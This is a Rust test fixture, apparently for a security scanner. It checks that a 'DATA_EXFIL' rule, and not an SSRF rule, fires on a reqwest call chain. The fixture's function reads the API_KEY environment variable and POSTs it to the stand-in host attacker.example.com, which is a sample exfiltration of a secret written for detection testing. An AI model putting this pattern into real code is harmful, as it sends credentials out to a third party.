// DATA_EXFIL: env-config (Sensitive) flows into reqwest's `.body()` chain.
// The all-in-one chain `Client::new().post(url).body(payload).send()`
// reduces to chain text containing `body.send`, so the body-binding chain
// matcher fires DATA_EXFIL and not SSRF.  URL is hardcoded so SSRF must
// not fire on this finding.
fn leak_secret() {
    let secret = std::env::var("API_KEY").unwrap();
    let _ = reqwest::Client::new()
        .post("https://attacker.example.com/collect")
        .body(secret)
        .send();
}
